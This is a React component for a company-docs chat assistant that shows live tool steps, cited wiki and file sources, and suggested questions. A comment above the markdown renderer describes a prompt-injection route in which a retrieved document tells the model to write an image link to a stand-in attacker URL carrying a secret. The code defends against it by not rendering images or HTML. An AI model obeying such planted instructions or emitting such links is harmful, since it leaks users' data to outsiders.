import { useEffect, useRef, useState, type FormEvent, type KeyboardEvent } from "react"
import ReactMarkdown, { type Components } from "react-markdown"
import remarkGfm from "remark-gfm"
import {
  ArrowUp,
  BookOpen,
  Check,
  ChevronRight,
  ExternalLink,
  FileText,
  Loader2,
  Sparkles,
  TriangleAlert,
} from "lucide-react"

import { Badge } from "@/components/ui/badge"
import { Collapsible, CollapsibleContent, CollapsibleTrigger } from "@/components/ui/collapsible"
import { api, type ChatReply, type Role, type Source, type StreamEvent } from "@/lib/api"

// One step the assistant took, shown live while it works ("Searching company docs").
interface LiveStep {
  id: string
  label: string
  result?: string
  done: boolean
}

interface Message {
  id: number
  role: "user" | "assistant"
  text: string
  reply?: ChatReply
  error?: boolean
  streaming?: boolean
  status?: string
  steps?: LiveStep[]
}

const SUGGESTIONS = [
  "What is the refund policy?",
  "What tech stack does the AI Delivery Intelligence Platform use? Check our wiki.",
  "What is the Pro plan per year in US dollars?",
]

function SourceCard({ source, index }: { source: Source; index: number }) {
  const isWiki = source.provider.toLowerCase().includes("outline")
  const Icon = isWiki ? BookOpen : FileText
  const body = (
    <div className="flex items-center gap-3 rounded-lg border bg-card px-3 py-2 text-sm transition-colors hover:bg-muted/60">
      <span className="flex size-6 shrink-0 items-center justify-center rounded-md bg-muted text-xs font-medium">
        {index}
      </span>
      <Icon className="size-4 shrink-0 text-muted-foreground" />
      <span className="min-w-0 flex-1 truncate font-medium">{source.title}</span>
      <Badge variant="secondary" className="shrink-0">
        {source.provider}
      </Badge>
      {source.url && <ExternalLink className="size-3.5 shrink-0 text-muted-foreground" />}
    </div>
  )
  return source.url ? (
    <a href={source.url} target="_blank" rel="noreferrer">
      {body}
    </a>
  ) : (
    body
  )
}

function StepRow({ step }: { step: LiveStep }) {
  const blocked = step.result === "blocked by access rules" || step.result === "failed"
  return (
    <div className="flex items-start gap-2 text-xs">
      <span className="mt-0.5 flex size-3.5 shrink-0 items-center justify-center">
        {!step.done ? (
          <Loader2 className="size-3.5 animate-spin text-muted-foreground" />
        ) : blocked ? (
          <TriangleAlert className="size-3.5 text-amber-600" />
        ) : (
          <Check className="size-3.5 text-emerald-600" />
        )}
      </span>
      <span className={step.done ? "text-muted-foreground" : "text-foreground"}>
        {step.label}
        {step.done ? "" : "…"}
        {step.result && <span className="text-muted-foreground/80"> · {step.result}</span>}
      </span>
    </div>
  )
}

// What the assistant did: live while it works, then folded into one line.
function StepsPanel({ message }: { message: Message }) {
  const steps = message.steps ?? []
  const details = message.reply?.steps ?? []
  if (message.streaming) {
    return (
      <div className="space-y-1.5 rounded-xl border border-border/60 bg-muted/30 px-3 py-2.5">
        {steps.length === 0 && (
          <div className="flex items-center gap-2 text-xs text-foreground">
            <Loader2 className="size-3.5 animate-spin text-muted-foreground" />
            {message.status ?? "Thinking"}…
          </div>
        )}
        {steps.map((st) => (
          <StepRow key={st.id} step={st} />
        ))}
      </div>
    )
  }
  if (!steps.length) return null
  const summary = steps.map((st) => st.label).join(" · ")
  return (
    <Collapsible>
      <CollapsibleTrigger className="group flex max-w-full items-center gap-1.5 text-left text-xs text-muted-foreground hover:text-foreground">
        <ChevronRight className="size-3.5 shrink-0 transition-transform group-data-[state=open]:rotate-90" />
        <Check className="size-3.5 shrink-0 text-emerald-600" />
        <span className="shrink-0">
          {steps.length} step{steps.length === 1 ? "" : "s"}
        </span>
        <span className="truncate opacity-70">· {summary}</span>
      </CollapsibleTrigger>
      <CollapsibleContent className="mt-2 space-y-2">
        <div className="space-y-1.5 rounded-xl border border-border/60 bg-muted/30 px-3 py-2.5">
          {steps.map((st) => (
            <StepRow key={st.id} step={st} />
          ))}
        </div>
        {details.map((step, i) => (
          <div key={i} className="rounded-lg border bg-muted/40 p-3 text-xs">
            <div className="mb-1 flex items-center gap-2">
              <span className="font-medium">Step {i + 1}</span>
              <Badge variant="outline" className="font-mono">
                {step.tool}
              </Badge>
            </div>
            <p className="font-mono text-muted-foreground">input: {JSON.stringify(step.input)}</p>
            <p className="mt-1 whitespace-pre-wrap break-words text-muted-foreground">{step.output}</p>
          </div>
        ))}
      </CollapsibleContent>
    </Collapsible>
  )
}

// Answers never load images or render raw HTML: a document could tell the model to
// write ![](https://attacker/?q=<secret>), and the browser would send it on its own.
// An image shows as its alt text instead.
const ANSWER_MARKDOWN: Components = {
  img: ({ alt }) => (alt ? <span className="text-muted-foreground">[{alt}]</span> : null),
}

function AssistantMessage({ message }: { message: Message }) {
  const reply = message.reply
  return (
    <div className="flex gap-3">
      <div className="flex size-8 shrink-0 items-center justify-center rounded-full bg-primary text-primary-foreground">
        <Sparkles className={message.streaming ? "size-4 animate-pulse" : "size-4"} />
      </div>
      <div className="min-w-0 flex-1 space-y-3 pt-1">
        <StepsPanel message={message} />

        {message.text && (
          <div
            className={
              message.error
                ? "text-sm text-destructive"
                : "max-w-none text-sm leading-relaxed [&_a]:underline [&_li]:my-0.5 [&_ol]:list-decimal [&_ol]:pl-5 [&_p]:my-2 [&_ul]:list-disc [&_ul]:pl-5"
            }
          >
            <ReactMarkdown remarkPlugins={[remarkGfm]} skipHtml components={ANSWER_MARKDOWN}>
              {message.text}
            </ReactMarkdown>
            {message.streaming && (
              <span className="ml-0.5 inline-block h-4 w-1.5 translate-y-0.5 animate-pulse rounded-sm bg-foreground/60" />
            )}
          </div>
        )}

        {reply && reply.sources.length > 0 && (
          <div className="space-y-2">
            <p className="text-xs font-medium uppercase tracking-wide text-muted-foreground">
              Sources
            </p>
            <div className="grid gap-2">
              {reply.sources.map((s, i) => (
                <SourceCard key={`${s.provider}-${s.title}`} source={s} index={i + 1} />
              ))}
            </div>
          </div>
        )}
      </div>
    </div>
  )
}

export function ChatView({ role }: { role: Role }) {
  const [messages, setMessages] = useState<Message[]>([])
  const [input, setInput] = useState("")
  const [loading, setLoading] = useState(false)
  const bottomRef = useRef<HTMLDivElement>(null)
  const nextId = useRef(1)
  const inputRef = useRef<HTMLTextAreaElement>(null)

  // Grow the input with its text (up to max-h-48), shrink back when cleared.
  useEffect(() => {
    const el = inputRef.current
    if (!el) return
    el.style.height = "auto"
    el.style.height = `${el.scrollHeight}px`
  }, [input])

  useEffect(() => {
    bottomRef.current?.scrollIntoView({ behavior: "smooth" })
  }, [messages, loading])

  async function ask(question: string) {
    const q = question.trim()
    if (!q || loading) return
    setInput("")
    const id = nextId.current + 1
    nextId.current += 2
    setMessages((m) => [
      ...m,
      { id: id - 1, role: "user", text: q },
      { id, role: "assistant", text: "", streaming: true, status: "Thinking", steps: [] },
    ])
    setLoading(true)
    const update = (fn: (msg: Message) => Message) =>
      setMessages((all) => all.map((msg) => (msg.id === id ? fn(msg) : msg)))

    function onEvent(e: StreamEvent) {
      if (e.type === "status") update((msg) => ({ ...msg, status: e.text }))
      else if (e.type === "step_start")
        update((msg) => ({
          ...msg,
          steps: [...(msg.steps ?? []), { id: e.id, label: e.label, done: false }],
        }))
      else if (e.type === "step_end")
        update((msg) => ({
          ...msg,
          steps: (msg.steps ?? []).map((st) =>
            st.id === e.id ? { ...st, done: true, result: e.result } : st,
          ),
        }))
      else if (e.type === "answer") update((msg) => ({ ...msg, text: e.text }))
    }

    try {
      const reply = await api.chatStream(q, onEvent)
      update((msg) => ({
        ...msg,
        text: reply.answer, // the final, checked answer replaces the streamed draft
        reply,
        streaming: false,
        steps: (msg.steps ?? []).map((st) => ({ ...st, done: true })),
      }))
    } catch (err) {
      update((msg) => ({
        ...msg,
        text: err instanceof Error ? err.message : "Something went wrong.",
        error: true,
        streaming: false,
      }))
    } finally {
      setLoading(false)
    }
  }

  function onSubmit(e: FormEvent) {
    e.preventDefault()
    ask(input)
  }

  function onKeyDown(e: KeyboardEvent<HTMLTextAreaElement>) {
    if (e.key === "Enter" && !e.shiftKey) {
      e.preventDefault()
      ask(input)
    }
  }

  return (
    <div className="flex h-full flex-col">
      <div className="flex-1 overflow-y-auto">
        <div className="mx-auto max-w-3xl space-y-6 px-4 py-6">
          {messages.length === 0 && (
            <div className="flex flex-col items-center pt-12 text-center sm:pt-20">
              <h2 className="text-2xl font-semibold tracking-tight">Ask your company docs</h2>
              <p className="mt-2 max-w-md text-sm text-muted-foreground">
                Answers come from your uploaded documents and the Outline wiki, with the sources
                cited under every answer.
              </p>
              <p className="mt-1 text-xs text-muted-foreground">
                Searching as{" "}
                <span className="font-medium">{role === "hr" ? "HR / Admin" : "Public user"}</span>
              </p>
              <div className="mt-8 grid w-full max-w-xl gap-2">
                {SUGGESTIONS.map((s) => (
                  <button
                    key={s}
                    onClick={() => ask(s)}
                    className="rounded-lg border bg-card px-4 py-3 text-left text-sm transition-colors hover:bg-muted/60"
                  >
                    {s}
                  </button>
                ))}
              </div>
            </div>
          )}

          {messages.map((m) =>
            m.role === "user" ? (
              <div key={m.id} className="flex justify-end">
                <div className="max-w-[85%] whitespace-pre-wrap rounded-2xl bg-primary px-4 py-2.5 text-sm text-primary-foreground">
                  {m.text}
                </div>
              </div>
            ) : (
              <AssistantMessage key={m.id} message={m} />
            ),
          )}

          <div ref={bottomRef} />
        </div>
      </div>

      <div className="pointer-events-none bg-gradient-to-t from-background via-background to-transparent pt-6">
        <form onSubmit={onSubmit} className="pointer-events-auto mx-auto max-w-3xl px-4 pb-4">
          <div
            onClick={() => inputRef.current?.focus()}
            className="flex cursor-text items-end gap-2 rounded-3xl border border-border/70 bg-background py-2 pl-5 pr-2 shadow-[0_2px_20px_-6px_rgba(0,0,0,0.12)] transition-all focus-within:border-foreground/25 focus-within:shadow-[0_4px_28px_-8px_rgba(0,0,0,0.2)]"
          >
            <textarea
              ref={inputRef}
              value={input}
              onChange={(e) => setInput(e.target.value)}
              onKeyDown={onKeyDown}
              placeholder="Ask anything…"
              rows={1}
              className="max-h-48 min-h-9 flex-1 resize-none bg-transparent py-1.5 text-[15px] leading-6 outline-none placeholder:text-muted-foreground/70"
            />
            <button
              type="submit"
              disabled={loading || !input.trim()}
              aria-label="Send"
              className="flex size-9 shrink-0 items-center justify-center rounded-full bg-foreground text-background transition-all hover:opacity-85 active:scale-95 disabled:bg-muted disabled:text-muted-foreground/60"
            >
              <ArrowUp className="size-4" strokeWidth={2.5} />
            </button>
          </div>
          <p className="mt-2 text-center text-[11px] text-muted-foreground/70">
            Enter to send · Shift + Enter for a new line
          </p>
        </form>
      </div>
    </div>
  )
}
